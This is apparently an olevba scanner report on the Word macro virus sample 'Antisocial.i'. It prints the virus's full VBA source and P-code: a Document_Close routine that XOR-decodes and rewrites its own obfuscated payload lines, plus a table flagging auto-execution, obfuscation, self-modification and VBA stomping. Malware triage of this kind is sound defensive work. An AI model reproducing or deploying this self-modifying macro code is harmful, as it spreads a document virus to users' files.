olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Antisocial.i
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Antisocial.i - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Application.EnableCancelKey = wdCancelDisabled
For V1 = 18 To 39
V2 = Null
V3 = (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(V1, 1))
V4 = Asc((Mid(V3, 2, 1)))
V5 = V4 Xor 39
For V6 = 3 To Len(V3)
V7 = Asc(Mid(V3, V6, 1)) Xor V5
V2 = V2 & Chr(V7)
Next V6
V8 = V2
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine V1, V8
Next V1
Call VM
End Sub
Private Sub VM()
'!@it&P7&;&7>&Ri&5?
'"S7%8%Kpii
'"S6%8%'"'%#%-QmlvAjfph`kq+SGUwjo`fq+SGFjhujk`kqv+Lq`h-4,+Fja`Hjapi`+Ilk`v-S4)%4,,
'$U7#>#Jmw+Qmg+*#)#;*#(#2
'$Elq#U6#>#2#Wl#Ofm+U0*
' Q1':'Ftd/Jnc/Q4+'Q2+'6..'_hu'Q3
'&W3!<!W3!'!Bis)W7(
' Ibs'Q2
' Q0':'Q5
'!RnouBieskchr(PDVtilcer(PDEikvihchru(Orck.7/(EibcKibsjc(TcvjgecJohc&P7*&$!$& &P1
'&Odyu!W0
'#Ktpmkjw*RmvqwTvkpagpmkj$9$4
' Hwsnhit)TfqbIhujfkWuhjws':'7
' Hwsnhit)DhianujDhiqbutnhit':'7
'$U;#>#WkjpGl`vnfmw-UASqlif`w-UA@lnslmfmwp-Jwfn+2*-@lgfNlgvof-Ojmfp+2/#WkjpGl`vnfmw-UASqlif`w-UA@lnslmfmwp-Jwfn+2*-@lgfNlgvof-@lvmwLeOjmfp*
'/[m|(^1(5(Fgzeid\mexdi|m&^JXzgbmk|&^JKgexgfmf|{&A|me 9!&KglmEgl}dm
' Q>)CbkbsbKnibt'6+'Q>)DhrisHaKnibt
'&W8/@eeGsnlRushof!W9
'/[m|(^I(5(Ik|a~mLgk}emf|&^JXzgbmk|&^JKgexgfmf|{&A|me 9!&KglmEgl}dm
'$UB-GfofwfOjmfp#2/#UB-@lvmwLeOjmfp
'"SD+DaaCwjhVqwlkb%S=
' FdsnqbChdrjbis)TfqbFt'AnkbIfjb=:FdsnqbChdrjbis)ArkkIfjb
End Sub 'Alcoholic Anarchists of America (AAA) Lys Kovick
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Antisocial.i
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11144 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	StartForVariable 
' 	Ld V1 
' 	EndForVariable 
' 	LitDI2 0x0012 
' 	LitDI2 0x0027 
' 	For 
' Line #3:
' 	LitVarSpecial (Null)
' 	St V2 
' Line #4:
' 	Ld V1 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Paren 
' 	St V3 
' Line #5:
' 	Ld V3 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Paren 
' 	ArgsLd Asc 0x0001 
' 	St V4 
' Line #6:
' 	Ld V4 
' 	LitDI2 0x0027 
' 	Xor 
' 	St V5 
' Line #7:
' 	StartForVariable 
' 	Ld V6 
' 	EndForVariable 
' 	LitDI2 0x0003 
' 	Ld V3 
' 	FnLen 
' 	For 
' Line #8:
' 	Ld V3 
' 	Ld V6 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld V5 
' 	Xor 
' 	St V7 
' Line #9:
' 	Ld V2 
' 	Ld V7 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St V2 
' Line #10:
' 	StartForVariable 
' 	Ld V6 
' 	EndForVariable 
' 	NextVar 
' Line #11:
' 	Ld V2 
' 	St V8 
' Line #12:
' 	Ld V1 
' 	Ld V8 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #13:
' 	StartForVariable 
' 	Ld V1 
' 	EndForVariable 
' 	NextVar 
' Line #14:
' 	ArgsCall (Call) VM 0x0000 
' Line #15:
' 	EndSub 
' Line #16:
' 	FuncDefn (Private Sub VM())
' Line #17:
' 	QuoteRem 0x0000 0x0012 "!@it&P7&;&7>&Ri&5?"
' Line #18:
' 	QuoteRem 0x0000 0x000A ""S7%8%Kpii"
' Line #19:
' 	QuoteRem 0x0000 0x0051 ""S6%8%'"'%#%-QmlvAjfph`kq+SGUwjo`fq+SGFjhujk`kqv+Lq`h-4,+Fja`Hjapi`+Ilk`v-S4)%4,,"
' Line #20:
' 	QuoteRem 0x0000 0x0018 "$U7#>#Jmw+Qmg+*#)#;*#(#2"
' Line #21:
' 	QuoteRem 0x0000 0x0016 "$Elq#U6#>#2#Wl#Ofm+U0*"
' Line #22:
' 	QuoteRem 0x0000 0x0020 " Q1':'Ftd/Jnc/Q4+'Q2+'6..'_hu'Q3"
' Line #23:
' 	QuoteRem 0x0000 0x0012 "&W3!<!W3!'!Bis)W7("
' Line #24:
' 	QuoteRem 0x0000 0x0008 " Ibs'Q2"
' Line #25:
' 	QuoteRem 0x0000 0x0008 " Q0':'Q5"
' Line #26:
' 	QuoteRem 0x0000 0x0050 "!RnouBieskchr(PDVtilcer(PDEikvihchru(Orck.7/(EibcKibsjc(TcvjgecJohc&P7*&$!$& &P1"
' Line #27:
' 	QuoteRem 0x0000 0x0008 "&Odyu!W0"
' Line #28:
' 	QuoteRem 0x0000 0x001C "#Ktpmkjw*RmvqwTvkpagpmkj$9$4"
' Line #29:
' 	QuoteRem 0x0000 0x001D " Hwsnhit)TfqbIhujfkWuhjws':'7"
' Line #30:
' 	QuoteRem 0x0000 0x001F " Hwsnhit)DhianujDhiqbutnhit':'7"
' Line #31:
' 	QuoteRem 0x0000 0x008A "$U;#>#WkjpGl`vnfmw-UASqlif`w-UA@lnslmfmwp-Jwfn+2*-@lgfNlgvof-Ojmfp+2/#WkjpGl`vnfmw-UASqlif`w-UA@lnslmfmwp-Jwfn+2*-@lgfNlgvof-@lvmwLeOjmfp*"
' Line #32:
' 	QuoteRem 0x0000 0x0042 "/[m|(^1(5(Fgzeid\mexdi|m&^JXzgbmk|&^JKgexgfmf|{&A|me 9!&KglmEgl}dm"
' Line #33:
' 	QuoteRem 0x0000 0x0022 " Q>)CbkbsbKnibt'6+'Q>)DhrisHaKnibt"
' Line #34:
' 	QuoteRem 0x0000 0x0014 "&W8/@eeGsnlRushof!W9"
' Line #35:
' 	QuoteRem 0x0000 0x0042 "/[m|(^I(5(Ik|a~mLgk}emf|&^JXzgbmk|&^JKgexgfmf|{&A|me 9!&KglmEgl}dm"
' Line #36:
' 	QuoteRem 0x0000 0x0022 "$UB-GfofwfOjmfp#2/#UB-@lvmwLeOjmfp"
' Line #37:
' 	QuoteRem 0x0000 0x0014 ""SD+DaaCwjhVqwlkb%S="
' Line #38:
' 	QuoteRem 0x0000 0x0038 " FdsnqbChdrjbis)TfqbFt'AnkbIfjb=:FdsnqbChdrjbis)ArkkIfjb"
' Line #39:
' 	EndSub 
' 	QuoteRem 0x0008 0x0030 "Alcoholic Anarchists of America (AAA) Lys Kovick"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

